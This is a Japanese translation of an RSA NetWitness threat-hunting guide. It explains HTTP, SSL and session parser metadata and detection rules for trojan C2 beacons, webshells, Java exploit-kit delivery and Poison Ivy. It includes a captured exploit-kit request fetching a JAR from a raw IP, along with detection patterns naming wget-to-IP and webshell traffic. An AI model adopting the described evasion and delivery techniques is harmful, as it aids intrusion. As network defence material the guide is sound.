キャプチャ時にHTTPヘッダーとその一意の値を解析することで、ヘッダーとその一意の値に一致する「シグネチャ」タイプのアプリケーションルールを記述するのは簡単です。
HTTP.luaパーサーによって生成されたメタデータは以下に示されています。

|サービス特性メタデータ|説明|
|:---:|:---|
|action |リクエストメソッド（ 'get' 'post'など）
|ad.computer.src | 'NTLMSSP'承認のホスト資格情報
|ad.domain.src | 'NTLMSSP'認証からのドメイン資格情報
|ad.username.src | 「NTLMSSP」認証からのユーザー資格情報
|alert.id | HTTPヘッダーの異常
|alias.host |リクエスト 'HOST：'ヘッダー
|alias.ip | IPv4の場合は 'HOST：'ヘッダーを要求する
|alias.ipv6 | IPv6の場合は 'HOST：'ヘッダーを要求する
|analysis.service| （オプション）高度なhttp分析特性
|attachment | POSTリクエストで提出されたファイル名
|client |リクエスト 'USER-AGENT：'ヘッダー
|content | 'CONTENT-TYPE'ヘッダー
|directory |リクエストディレクトリ
|error |レスポンスステータスコード（2xxでない場合）
|extension |要求ファイル名の拡張子
|filename |リクエストファイル名
|http.request | （非標準）（オプション）要求ヘッダーの種類
|http.response | （非標準）（オプション）応答ヘッダータイプ
|ioc |高度な分析による妥協の指標（オプション）
|language |レンジャーヘッダーの言語
|orig_ip |プロキシクライアントのIPアドレス
|password | 「基本」認証からのパスワード認証情報
|query |クエリ文字列を要求する
|referer |リクエスト 'REFERER：'ヘッダー
|req.uniq | （非標準）（オプション）要求ヘッダー値
|resp.uniq | （非標準）（オプション）応答ヘッダー値
|server |応答 'SERVER：'ヘッダー
|service | 80
|url | （非標準）（オプション）完全リクエストURL
|username | ベーシック認証からのユーザー認証情報

**http.lua** パーサーは、明示的なプロキシHTTP要求を識別し、そのメタデータをanalysis.serviceに登録します。
パーサーは、前述の **http_lua_options.lua** ファイルで設定されたキーの下でUser-Agentを見つけて登録します。

前述のHTTPヘッダーロジックを有効にした後で、ヘッダーをメタデータとして取得したので、追加のメタデータを適用してHTTPセッションを細かく調べることができます。
最近のWebブラウザでは、要求を行うときに6つ以上のHTTPヘッダーが使用されます。
これらのヘッダーの一般的な例は、 **Accept、Accept-Encoding、Accept-Language、Cache-Control、Connection、Host、Referer** および **User-Agent** です。
このようにして、要求を行った人とマシンを分離することができます。

|サービス特性メタデータ|説明|
|:---:|:---|
|two http headers| 2つのHTTPヘッダー
|three http headers| 3つのHTTPヘッダー
|four http headers| 4つのHTTPヘッダー
|four or less headers| 4つ以下のHTTPヘッダー
|six or less headers| 6つ以下のHTTPヘッダー

たとえば、以下に表示されるトロイの木馬は、HTTP POSTメソッドを使用してC2にデータを送信します。
GETメソッドは、データを受信するために使用されます。
したがって、2つのHTTPセッションでリダイレクトされるコマンドシェルの入力と出力があります。
以下に示すように、POSTメソッドはContent-Lengthヘッダーを必要とします。
このヘッダーは、この例では、存在し、青い矢印で示されています。
ただし、送信する4096バイトがない場合でも、POSTごとに4096バイトの静的な値です。
赤い矢印は、HTTP要求ヘッダーの終わりと本文の末尾までの本文の始まりを示します。
明らかに、これは4096バイトのペイロードではありません。
**http.lua** パーサーのメタデータを使用して、これらのタイプの接続をさらに探すためのクイック検出ルールを作成することができます。

![Figure 6. MSU Trojan Beacon](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466535/MSU_Trojan_543x332.png)

```
Service = 80 &&
http.request = ‘Content-Length’ &&
req.uniq = ‘4096’ &&
analysis.service = ‘six or less headers‘ &&
analysis.service != ‘four or less headers’ &&
size = L-4096
```

MSU_rat Luaパーサーが存在しない場合は、アプリケーションルールをすばやく作成して、数分でエンタープライズ全体にプッシュできます。
完全な検出パーサーを作成し、有効性をテストするのに時間はかかりません。
この特定のケースでは、環境内にこのトロイの木馬のいくつかの亜種があり、すべてが異なるドメインに向かっています。
 HTTPプロトコルをこの細かさで分析することで、アナリストはトロイの木馬の亜種をすぐにturn aroundして検出することができました。

これは純粋に既存のメタデータに基づいて妥協の指標を作成する例を表しています。
これは、従来のIDS/IPSの意味でのシグネチャと同等ではなく、トラフィックが正当であるか不正であるかを判断するためにアナリストにデータを確認する必要があります。
利用可能なすべてのトラフィックがあるため、アナリストはアクターによって実行されたアクションを再構築することができました。
これは、NetWitnessと共通のIDS/IDPの主要な差別化要因であり、後者では不可能です。
IDS/IDPではデバイスにシグネチャが適用された以降のデータしかパターンマッチングできないからです。

## User-Agent

HTTPトロイの木馬は、通常のHTTPトラフィックと混同しようとします。
User-Agentは、アクティブなWebアプリケーションのアプリケーション識別子です。
インターネットエクスプローラの場合、一般的にオペレーティングシステムとそのブラウザの拡張機能がインストールされています。
トロイの木馬は、User-Agentでハードコードされているか、またはWindowsレジストリからUser-Agentを読み込みます。
マルウェアによって使用される人気のあるUser-Agentが以下に表示されています。

```
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
```

このUser-Agentは、オペレーティングシステムがWindows XP 32ビットで、Internet Explorer 6.0でセキュリティセンターバージョン1のService Pack 2を実行していることを示しています。
このサービスパックは2004年にリリースされました。
実際のユーザーが10年以上前のオペレーティングシステムとブラウザでブラウジングしている可能性は非常に低いです。
このUser-AgentでWebリクエストを生成するアプリケーションは、おそらく人間によるものではなく、何らかの自動化されたリクエストを表します。
http.luaパーサは、選択したキーにメタを登録するように設定できます。
デフォルトでは、メタはクライアントキーに登録されます。
以下のロジックは、ユーザーエージェントを分類するために適用されます。
このタイプのロジックは、ライブコンテンツ全体に存在し、プロトコルや動作アーチファクトによって興味深いトラフィックをセグメント化しようとします。

|サービス特性メタデータ|説明|
|:---:|:---|
|http short user-agent | 56バイト未満のUser-Agent
|http long user-agent | 56バイト以上76バイト未満のUser-Agent
|http max length user-agent  | 256バイト以上のUser-Agent
|http short user-agent ie | 'IE 3-11'を含む56バイト未満のUser-Agent
|http no user-agent | HTTPリクエストにUser-Agentは存在しません
|http nonstandard mozilla | Mozillaは含まれているが、バージョン3.0, 4.0、または5.0が含まれていないUser-Agent
|http not good mozilla | 標準のMozilla識別子のないUser-Agent
|http java | Java仮想マシンによって生成されるUser-Agent
|http suspicious user-agent| 共通の書式設定間違いを持つUser-Agent
|http wget direct to ip | 直接IPアドレスを指定しているwgetアプリケーション

## ホスト名

DNSとドメイン名は、しばしばインターネットのバックボーンと呼ばれます。
rsa.comなどのフレンドリ名は、レイヤ3ルーティングインフラストラクチャで理解できるIPアドレスに解決されます。
また、C2でのトロイの木馬、ポート計算、アクションのシグナル通知などの悪意のある目的にも使用されます。
すでに説明したメタデータを使用して、データセットを管理可能な動作のバケットに編成する場合、アナリストは一般に、NetWitnessのalias.hostレポートを参照して、トリアージ動作を開始する必要があります。

アナリストは、 'go0gle.com'のようなスペルミス、 'jhkhajdsfgasdkfhk.info'のようなナンセンスドメイン、 'australiantestnew233s.info'のような一見無害な名前を探す必要があります。
これらのドメインを抽出してから、Virustotal、Robtex、Bulk SEO Toolsのようなオンラインツールを使用して実行し、最近の登録日や偽の登録者情報を検索することをおすすめします。
これを念頭に置いて、Liveコンテンツには疑わしいドメインを識別するためのロジックが組み込まれており、アナリストは特定の時間に分析しているデータの量を減らしてデータセットを掘り起こすことができます。

|サービス特性メタデータ|説明|
|:---:|:---|
|suspiciously named domain| Google、Appleなどが含まれていて、.google.comや.apple.comで終わらないドメイン
|hostname consecutive consonants| 5つ以上の連続した子音または数字、または4つの連続した子音または数字の2つのグループを探している正規表現。DGA（ドメイン生成アルゴリズム）を発見するのに便利です。
|dynamic dns host| ダイナミックDNSプロバイダのサブドメインであるalias.hostエントリ
|dynamic dns server| 既知の動的DNSサーバと一致するalias.hostエントリ
|http direct to ip| IPに直接接続するHTTPリクエスト。 ホスト：10.0.0.1など。
|tld_is_not_com_org_net | com、orgまたはnetのいずれでもないtld。

## Java VM

Java Virtual Machine（JVM）は、脆弱性に関する調査の対象となっており、マルウェアの配信には好都合です。
オラクルが最新バージョンに組み込んでいるセキュリティの向上があっても、多くの企業は、依然としてビジネスに依存しているサポートされていないアプリケーションのために、長年の実装に悩まされています。
これにより、サイバー犯罪者はまれに閉鎖されるアプローチの道を開くことができます。

私たちの目的のために、悪用とマルウェアの配信に関連する3つの主要コンポーネントの動作を分析します。
私たちはJAR（Java ARchive）、Javaクラス、Javaアプレットに興味があります。
アプレットは、通常、ブラウザのコンテキストで実行される小さなスクリプトです。
エクスプロイトアプレットは一般に、デコードキーやアプレットによって設定された別の特別なパラメータなど、特定の起動プロパティを使用してJARまたはクラスファイルを参照します。
オペレーティングシステムとJavaバージョンの2つの例があります。
これらは通常、適切なエクスプロイトのプロファイルと配信に使用されます。
これが、JVMがこれらのClassまたはJARファイルを取得し、アプレットによって指定されたパラメータで起動するところです。
JVMの興味深い成果物は、デフォルトで、そのUser-Agentが要求を完了するJavaのバージョンであるということです。

```
GET /links/cleared-brought_nowhere.php?dikrsiy=3536073536&likv=3333&lmgfyflc=oocaw&cmkmtfz=cnsxp HTTP/1.1
accept-encoding: pack200-gzip, gzip
content-type: application/x-java-archive
User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_32
Host: 188.165.4.201
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Via: 1.1 localhost.localdomain
```

このインジケータを使用して、一定期間インターネットに到達するJVMアクティビティのみを絞り込むためのルールをいくつか作成できます。
次の表に、JVMに関連するメタデータを示します。

|メタデータ|メタキー|説明|
|:---:|:---:|:---|
|http java | analysis.service| HTTP経由のJVMリクエスト
|java exe | ioc | `direction = outbound`および`filetype = windows executable` を使用したHTTP経由のJVMリクエスト
|java pdf | ioc | `direction = outbound` および `filetype = pdf` を使用したHTTP経由のJVMリクエスト
|http possible exploitkit| ioc | `direction = outbound`で、認識されたファイルタイプがないHTTP経由のJVMリクエスト

インターネットへのすべてのJVMおよびGETメソッド要求を分析する必要があります。
多くの場合、配信されるマルウェアはエンコードされず、JARまたはClassファイルの後の要求は実行可能ファイルになります。
Forensic Fingerprintでこのメタデータを見つけることができます。
RSAリサーチチームは、alias.hostとtldを開くと、関連するドメインをすばやくスキャンして、異常なものを探すことができることがわかりました。
JVMエクスプロイトのペイロードのすべてが明確になるわけではありません。
エクスプロイトJARには、ペイロードをサーバーからダウンロードした後に解凍するためのコードが含まれています。
これらのセッションがシングルバイトのXORキー以外でエンコードされている場合、パーサーは実行可能ファイルを検出しません。
これは単にバイナリデータの「ブロブ」に過ぎません。
これは、Javaトラフィックを分析するための重要な指標です。
小さなJARまたはClassファイルがダウンロードされた後にペイロードを識別できない場合は、JARを深く掘り下げたり、エンコーディングスキームのペイロードを調べる必要があります。

以下の例では、簡単なXORエンコーディングスキームでエクスプロイトペイロードが配信されました。
JARはペイロード全体にDWORD XORキーを使用していたため、NetWitnessによってネイティブに識別されませんでした。
理論的にパーサーは、これらを検出するために使用できます。
ただし、キーの長さを追加すると、処理量は指数関数的になります。
これらの符号化方式は、XORキーがPEヘッダーであると推定されるもののパディングセクションで繰り返されることがあるため、手動で簡単に検出できます。

![Figure 10. Encoded Payload](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466518/EncodedPayload_440x307.png)

![Figure 11. Decoed Payload](https://community.rsa.com/servlet/JiveServlet/showImage/102-62341-232-466599/DecodedPayload_438x288.png)

この例のようにペイロードを抽出するのは必ずしも簡単ではありません。
しばしば、JARの個々のクラスファイルをデコンパイルして検査しなければならず、おそらくデバッグして修正して、使用されているエンコーディングまたは暗号化アルゴリズムを発見する必要があります。
マルウェア作者は、エンコードされたマルウェアをデコードして実行するために、ノンスを用いるワンタイムキーを生成することさえあります。
これは、アナリストや研究者にとって、完全なパケットキャプチャが必須であるもう一つの理由です。

## その他のHTTPインジケータ

悪質なソフトウェアを見つけるために組み合わせることができる、HTTPの多くの指標、動作、技術的側面があります。
ライブコンテンツパーサーは、アナリストのためのインテリジェントな方法で、最も一般的な妥協の指標[IOC]を自動的に組み込みます。
これは、HTTPデータセットでのハンティングに使用されるIOCの明確なリストではありませんが、調査の出発点となります。

**http with base64** と **http with binary** には特別な言及が必要です。
これは、通常のHTTPトラフィックのように見えるようにC2に送り返されるデータを難読化するための一般的な手法です。
Base64データは、素早くデコードして、内部にあるもの、たいていはバイナリデータを発見することができます。
これらのセッションに含まれるデータが適切に解読されない場合は、トロイの木馬内に特別なBase64変換テーブルが定義されている可能性があります。
同様に、バイナリデータは単純なシングルまたはマルチバイトのXORでない限り、構造を発見するためにバイナリ解析とプロトコルリバースエンジニアリングを必要とするランダムな非ASCIIデータのように見えます。
多くの正当なアプリケーションでは、これらのメソッドを使用してデータを転送しますが、アナリストがデータセットを使用した経験があれば、簡単に無視できます。

|サービス特性メタデータ|説明|
|:---:|:---|
|http with base64  |本文にBase64でエンコードされたデータを含むHTTP
|http with binary |本文にバイナリデータを持つHTTP
|watchlist file fingerprint| Windows実行ファイル、JARなどのマルウェアで一般的に使用される実行可能ファイル形式
|watchlist file extension | .exe、.php、.zipなどのマルウェアで一般的に使用される実行可能な拡張子
|http explicit proxy request | Requestメソッドの後にプロトコルと完全なURLを要求する明示的なプロキシ要求の試み
|http long query | 256バイト以上のクエリ文字列
|http suspicious connect |ヘッダーが4つ未満で、ユーザーエージェントがないHTTP CONNECTメソッドを使用するセッション
|http response filename exe  | exeで終わるインライン・ファイル名を持つHTTP要求に対するサーバーの応答
|http webshel​​l | GETおよびPOSTスタイルのWebシェル用の各種インジケータ
|http webshell no error | HTTPサーバーの応答エラーを生成しないGETおよびPOSTスタイルのWebシェル用のさまざまなインジケータ
|http webshell error | HTTPサーバーの応答エラーを生成するGETおよびPOSTスタイルのWebシェル用のさまざまなインジケータ
|http post no get missing content-length | Content-Length HTTPヘッダーを含まないことによってRFCに違反するHTTP POST要求
|http post no get low header count not flash |ヘッダーが6未満でUser-Agentに'shockwave flash'を含まないPOSTリクエスト
|http post no get short filename suspicious extension |実行可能な拡張子を持つ3バイト以下のファイル名に対するHTTP POST要求
|direct to ip one char php | 1文字のPHPスクリプトを照会するダイレクトIPへのHTTPリクエスト

![Figure 12. HTTP with Base64 Encoded Data in Body](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466480/HTTP_base64_639x476.png)

![Figure 13. HTTP with Binary Data in Payload](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466488/HTTP_binary_649x488.png)

## HTTPハンティングのまとめ

![Figure 14. Netwitnes Hunting Theory](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466444/NW_HuntingTheory_253x278.png)

### 期間

NetWitnessでのハンティングの第一歩は、おそらく最も重要なステップです。
アナリストは、さまざまなメタカテゴリを使用して掘削を開始する前に、まず「私は何時を見ていますか？」という質問に答える必要があります。
アナリストは、ほとんどの従来のフォレンジックツールとは異なり、NetWitnessは常にデータをキャプチャしており、ほぼリアルタイムで結果を提供していることを認識している必要があります。
過去24時間のデフォルト値を選択してブラウザをリフレッシュすると、過去24時間の時間オフセットが変更されます。
たとえば、午前9時に調査を開始してWHERE句を使用して最後の24時間を選択し、正午に昼食に行った場合、コンピュータに戻ってNetWitnessにログインして検索を続行すると、過去24時間は私が戻った時から元の午前9時+ 24時間よりも進んでいます。
この時間の問題の矢印は、相対的な時間オフセットではなく、絶対的な時間オフセットを選択することによって解決されます。
簡単に言えば、アナリストは、過去1時間、過去3時間などの相対オフセットを使用するのではなく、静的な時間ブロック全体（たとえば、昨日）を分析する必要があります。

### 方向性

次のコンセプトは方向性です。
どのような種類の脅威を探していますか、どのような方向性がありますか？
トロイの木馬C2通信を探しているなら、彼らはネットワーク内にあり、外部リソースに接続していると仮定します。
私たちはアウトバウンド方向を選択します。
webshellの活動を探しており、traffic_flow_options.luaを適切に設定している場合は、インバウンド方向を選択します。
最後に、ファイアウォールポリシーや侵入されたDMZマシンからのアクセスを奪うための何らかの内部リレーを探している場合、我々はラテラルムーブメントを選択します。

### サービス

絶対時間オフセットを選択して方向を選択したので、分析するサービス（この場合はHTTPまたはservice = 80）を選択できます。
データセットを関連するデータのみに絞り込み、実際の分析を開始できます 。

### 分析開始

この後の最初のクエリは、データセットをより小さなバケットに分割して、より詳細に調べることを目的としています。
これらは私たちの技術的側面と行動の問い合わせです。
我々はまだ妥協の指標を探しているわけではない。
むしろ、行動（メソッドの使用法など）や技術的側面（短いユーザーエージェントストリングやウォッチリストファイル拡張など）に基づいてトラフィックを選択しています。

たとえば、HTTPなどのよく知られたプロトコルでの秘密双方向通信を探しているときは、HTTPメソッド分析に戻ることができます。
ほとんどの環境でHTTP POSTはHTTP GETの約10％です。
これを知って、私たちは効果的に **http post no get** を照会することができます。
現在、トラフィックの約90％を現在無益です。

サービス特性メタキーは、**http post no get** の前のクエリなど、行動的および技術的な側面のクエリから始めます。
スループットとデータセットの特定の側面に応じて、適切でないか疑わしいものを見つける前に少し深く掘り下げなければならないかもしれません。
アナリストは、サービス特性メタキーを使用して、人間が生成した動作のように見える部分を切り出し、マルウェアが示す自動動作に焦点を当てることができます。
以前は、最新のブラウザでは6つ以上のHTTPヘッダーが使用されていました。
したがって、6つ以下のヘッダーでHTTPセッションを掘り下げると、これらのセッションが削除され、より興味深いものが残されます。

ここからは、以前に説明したHTTPの側面を調べ、正常な動作であることがわかっていることに基づいて説明できないセッションを探します。
リファラーなしでHTTP POSTが表示されたら、どうやってそれにアクセスしましたか？
私たちが奇妙なUser-Agentに遭遇した場合、そのアプリケーションは何であると言いますか？
信頼できるベンダーと同様の奇妙なドメイン名が見つかりましたが、ドメインがそのベンダーによって登録されていない場合はどうなりますか？
多くの場合、ネットワークの可視性のみでは、トラフィックの原因を見つけるまで、これらの質問に答えることは困難です。

### 深層分析

潜在的に外れているようなものを発見すると、実際の調査が始まります。
アクティビティが発生している期間とホスト数はどのくらいですか？
リース時間の短いDHCP環境では、DHCPログが利用可能かどうかを判別するのが難しくなります。
たとえば、アナリストがfoo.comと不審なHTTP通信を見つけた場合、アナリストは宛先IPに注意して新しいInvestigatorウィンドウを開く必要があります。
次に、宛先IPを取得し、`ip.dst = 123.123.123.123 || ip.src = 123.123.123.123 || alias.ip = 123.123.123.123`を照会します。
これにより、コミュニケーションの可能なイニシエータの両面が得られます。
C2 IPからのインバウンドwebshellアクセスと、それにビーコンを送信するトロイの木馬が存在する可能性があります。

```
注：アナリストは、このドリルダウンアクティビティをより簡単に実行できるようにコンテキストアクションを追加することもできます。
```

### 例

次の例では、トロイの木馬Rekafが発するビーコンを調べて、それが生成するメタデータの一部を観測しています。
NetWitnessのテキストビューに表示されるセッションは、次のとおりです。

![Figure 15. Rakaf Beacon](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466538/Rekaf_Beacon_659x469.png)

以下のセッション特性が観察されました。

![Figure 16. Rakaf Session Characteristics](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466598/Rekaf_Session_530x282.png)

送受信データの総量は5KB未満ですが、内部から外部に対して受信サイズをはるかに超えるサイズのデータを送信しています。
それ以上のことはわかりませんが、これはトロイの木馬の通信特性として非常に興味深いものです。

![Figure 17. Rakaf Service Characteristics](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466586/Rekaf_Service_570x335.png)

このメタキーを見れば状況はさらに明らかになります。
このリクエストにはPOSTメソッドがありますがGETメソッドはなく、Referrerヘッダーが含まれていないことがわかります。
ブラウザを使った一般的な操作ではこのような挙動はあり得ません。
また、Windowsレジストリに格納されているデフォルトのUser-Agentと思われる短いUser-Agentと、6つのHTTPヘッダーがあることもわかります。
さらに2つのキャッシュ・ディレクティブとクッキーが存在しないということは、この通信がユーザー操作によって行われたものではなく、プログラムによって行われた可能性が高いことを示しています。
それを示す最も明白なインジケータは、リクエストの本文内のバイナリペイロードです。
すべての文字がASCIIの範囲にあるわけではないので、NetWitnessは印刷不可能な文字を '.' としてレンダリングします。

ESAのEvent Stream Analysisには、アナリストがHTTPでのハンティングに適用するロジックと非常によく似たロジックが含まれています。
Rekafについては、次の図を参照してください。

![Figure 18. ESA C2 Detection](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466450/Rekaf_ESA_578x635.png)

ESAアプライアンスは、定期的に送信HTTPトラフィックをデータセットに照会し、特定のスコアを生成し重み付けする機械学習アルゴリズムを適用します。
この方法ですべてのHTTP通信が評価され、スコアが発生します。
最も重大なインシデント・マネージャ・キューにインシデントが生成されます。
重大なインシデントを抽出するために必要なデータがすべてNetWitnessサービスから得られるわけではありません。
WHOISの情報はLiveから集められ、ドメインのエージングと期限切れの情報でスコアを高めます。
このタイプのシステムはアナリストを補強し、人間が行うよりも複数のセッションかつ長い期間にわたって分析します。
NetWitnessを検索する際には、単一のセッションや何らかの種類のビーコニングパターンが目立つように探しています。
ESAは、すべてのHTTPトランザクションの接続統計をメモリに保持し、人間には認識できないパターンを探します。
以下は、得点したカテゴリと説明のリストです。

|ESA 評価カテゴリ|説明|
|:---:|:---|
|Beacon Behavior| このソースIPとこのドメインとの間の通信が非常に規則的であるため、C&Cの疑いがあることを示します。
|Domain Age| レジストラの登録日に基づいて、このドメインが比較的新しいことを示します。
|Expiring Domain| ドメインがすぐに期限切れになる可能性が高いことを意味します。
|Rare Domain| 過去1週間、このネットワーク上でこのドメインに接続されたIPが比較的少ないことを示します。
|No Referers | このドメインにリファラ経由で接続するIPの割合が比較的低いことを示します。
|Rare User-Agent| まれなユーザーエージェントを使用しているドメインのIPの割合が高いことを示します。

最終スコアを生成するために使用された得点計算のより詳細なビューです。

![Figure 19. ESA C2 Detection Scoring Detail](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466590/Rekaf_ESA_Scoring_637x726.png)

# SSL/TLS

SSL/TLSパーサーは実際にはX.509証明書パーサーと呼ばれるべきです。
サーバによる「Change Cipher Spec」メッセージの後は、すべてのデータが暗号化されたランダムなデータとみなすことができます。（暗号が解読されてしまう一部の脆弱性を除外して）
SSL/TLSに適用される唯一のロジックは次のとおりです。

- **bad_ssl** SSLで'localhost'を探索している通信
- DGA [Domain Generation Algorithm]のような子音が連続するホスト名の探索

ペイロードはほぼすべて暗号テキストなので、SSL CA、SSL Subjectおよびセッション特性メタカテゴリがSSL/TLSを掘り下げる唯一の場所です。
既知のSSL/TLSトロイの木馬が見つかっており、暗号化とHMACアルゴリズムが分かっている場合、アナリストはCrypto Keyのメタカテゴリで一致を調べることができます。

SSL CAがSSL Subjectと同じである場合、自己署名証明書のメタデータが定義されます。
これは合法的に起こる場合もあります（たとえばGoogleなど、かなり長い間CAだったため）
Hunting Packで説明したトラフィックフローのメタデータを使用したこれらのセッションは、以下に示すようにビーコニングタイプの動作を調べることができます。

![Figure 20. Example SSL Beaconing](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466489/770-257/SSL_Beacon.png)

# その他のサービス

サービスタイプOTHERはアナリストを混乱させることがよくあります。
「プロトコルXがサービスXとして登録されなかった理由」はおそらく最もよく聞かれる質問です。
NetWitnessには、サービスを識別し、そのプロトコルに関する詳細の大部分を解析するパーサーのデフォルトセットが付属しています。
ライブコンテンツ管理システムには、プロトコルを識別し、個々のセッションに関する追加の詳細を探すための数百の追加のパーサーが含まれています。
CPUのパフォーマンスと、パーサーが特定のセッションで実行できるロジックの量との間には、トレードオフがあります。
また、データセットを見ているフォレンジックアナリストの視点も考慮する必要があります。

はたして、KerberosとQQメッセンジャープロトコルの違いをHTTPのように詳細に解析する必要があるでしょうか？
そのプロトコルのサービスタイプを判定するに足る、明確な挙動や印が定義されているでしょうか？
セッションには多くの場合、ハンティングに無関係なKerberosのようなプロトコルや、QQなどのあいまいなプロトコルが混在しています。

サービスタイプOTHERの多くは、SYNタイムアウト、32MBまたは60秒の制限に達した後で再開されたセッション（バージョン10.5以降はこれが大幅に削減されています）や、暗号化されていてプロトコルが識別できないP2P通信です。
これらのプロトコルの解析と識別にリソースを費やすのではなく、ハンティングに役立つセッションにリソースを使用するのがNetwitnessの戦略です。

## セッションLuaパーサー

トラフィックフローの特定のセクションでは、traffic_flow.luaパーサーから生成されたメタデータが役に立ちます。
アナリストは、first carveルールを使用して、シングルサイドセッション、ゼロペイロード、および内部トラフィックをデータセットから最初にフィルタリングできます。
次のセッション特性を使用して、より詳細なトラフィックをさらに分類できます。

|メタデータ|説明|
|:---:|:---|
|long connection|30秒以上継続しているセッション
|suspicious other|サービスタイプOTHERのうち、ペイロードが0byte以上でSYNフラグが確認できているセッション

session_analysis.luaパーサーはこの検索にとって非常に重要です。
NetWitnessは、現実的なメモリサイズと転送速度を実現するために、セッションの途中で分析を開始します。
このときにTCPフラグが非常に重要になります。
たとえば、ブラウザを開いて「foo.com/bin.iso」からISOを要求すると、HTTPリクエストは次の図のようになります。

```
GET /bin.iso HTTP/1.1
Host: foo.com
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like G
ecko) Chrome/40.0.2214.115 Safari/537.36
DNT: 1
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8
```

このISOが4.7GBのDVDイメージだった場合、最初のセッションはサービスタイプ80またはHTTPで、サイズは32MBになります。
次のセッションはすべて同じサービスタイプで、サイズが32MBで、要求を開始したセッションと同じTCP送信元ポートを持ちます。
しかし、バージョン10.5以降、これらの分割セッションはデコーダ内の状態テーブルで追跡され、session.splitメタキーと論理的にリンクされます。
以下の長いSSL接続でこのロジックが動作していることがわかります。

![Figure 22. State Tracking with Session Splitting](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466610/638-899/StateTracking.png)

デコーダは、どのIP/ポートの組み合わせがセッションを開始したかに基づいて要求と応答を判断します。
私のローカルIPアドレスが192.168.1.10で、リモートサーバが192.168.5.5の場合、以下のようなクエリは、接続が開始されてからすべての継続トラフィックを選択します。

```
(ip.src = 192.168.1.10 || ip.dst = 192.168.1.10) && (ip.src = 192.168.5.5 || ip.dst = 192.168.5.5)
```

ただし、TCP SYNフラグを追加のメタデータとして指定することで、TCPセッションの開始を確実に取得できます。
これにより、分析の邪魔になる他の継続トラフィックが排除されました。

```
(ip.src = 192.168.1.10 || ip.dst = 192.168.1.10) && (ip.src = 192.168.5.5 || ip.dst = 192.168.5.5) && tcpflags = 'syn'
```

サービスタイプOTHERには次のような興味深いセッションが含まれます。

- exeやアーカイブなどのファイルをやり取りしている通信
- 一般的なプロトコルで使用される80,443,53などのポートを利用した通信

現在これを分析するために、バイナリインジケータとバイナリハンドシェイクの2つの追加のメタデータがあります。
これらの2つはセッション特性に登録され、TCP接続の特定の特性を探します。

最初のバイナリインジケータは、TCPセッションのペイロードの最初の8バイトを調べ、各バイトをフレーム長と比較します。
次に、TCPセッションの最初の16バイトを読み取り、ビッグエンディアンとリトルエンディアンの各ワード[2バイト]をフレーム長と比較します。
これらのチェックのいずれかが当てはまる場合、メタが追加されます。
これは、カスタムプロトコルを使用してデータフローを制御する一般的なトロイの木馬の特徴を探しています。
Gh0stとして知られているトロイの木馬は、フレームヘッダーの後のペイロードがzlibライブラリで圧縮され、ペイロードの圧縮サイズとペイロードの圧縮されていないサイズを知る必要があるため、この方法を使用します。

TCPセッションに2つのストリームがあり、各ストリームのペイロードが256バイトを超えると、バイナリハンドシェイクメタが起動します。
バイトはループされ、ASCII範囲内にあるかどうかが確認されます。
分析される512バイトの非ASCII文字の数が310より大きい場合、メタが登録されます。
これはカスタムプロトコルのもう1つの成果物であり、first carveとservice=0と組み合わせたこれらの2つのメタ値は、アナリストにNetWitnessの他のセッションを分析するための観点を与えます。

## レイヤ4インジケーター

一部のトロイの木馬C2プロトコルでは、レイヤ4以降のインジケータが残っています。
NetWitnessパーサーは、ペイロードデータに対してのみ動作します。
レイヤー4以下のものは、デコーダー処理自体で理解する必要があり、パーサー自体と同じように変更するのは簡単ではありません。
Luaライブラリnw.packetは、個々のパケットとヘッダー情報を問い合わせるメソッドを提供します。
よく知られているTrojan Poison Ivyは、Camellia ECBを使用してサーバーとクライアント間のセッションを暗号化します。
ハンドシェイクは、サーバーとクライアントの間の0x100または256バイトの交換です。
このハンドシェイクのデータは、トロイの木馬の設定済みのパスワードに基づいています。
共通のパスワードに基づいて署名を作成しようとすると、リストにないパスワードを使用するだけで簡単に回避できます。
これにより、Poison Ivy Trojanは、年齢や既知の特性にもかかわらず、標的とされた侵入の定番となりました。

![Figure 25. Poison Ivy Handshake](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466531/770-482/PoisonIvy.png)

Liveにはpoison_ivy.luaパーサーがあり、Poison Ivyが利用する256バイトの認証交換を探しています。
完全な256バイトの交換はIndicator of Compromiseメタカテゴリに警告し、256バイトのビーコンはそれを警告します。
他のサービスと組み合わせると、このタイプのトロイの木馬や通信プロトコルを検索する際の強力な指標になります。

# その他のプロトコルの異常値

HTTP、SSLおよびその他のサービスには、トロイの木馬C2に関連するセッションが通信する場所が多いため、多くの注意が払われています。
悪意のある行為は必ずしもトロイの木馬に関連付けられているとは限りません。
誤った設定やその他の種類の動作によって引き起こされる可能性があります。
以下のサブセクションでは、FTP、RDP、SSH、DNS、ICMP、CIFS、およびDNSの他のサービスおよびプロトコルにおける悪意のある行為について概説します。
これらは、一般的なC2方式以外の悪意のある活動のネットワークトラフィックを調べる際に最も悪用されるサービスです。

## FTP

FTPプロトコルは、この文書の執筆時点で約30年間続いています。
これは非常に単純なプロトコルであり、セッションで多くの冗長性を提供しません。
注意すべき点の1つは、STORコマンドとRETRコマンドがそれぞれアクションメタデータカテゴリにPUTとGETとしてマップされていることです。
ほとんどの組織はある種のNATの背後にあるので、パッシブFTPはFTPセッションの最も一般的なタイプです。

パッシブとアクティブなFTPの説明は、インターネット上で簡単に検索できます。
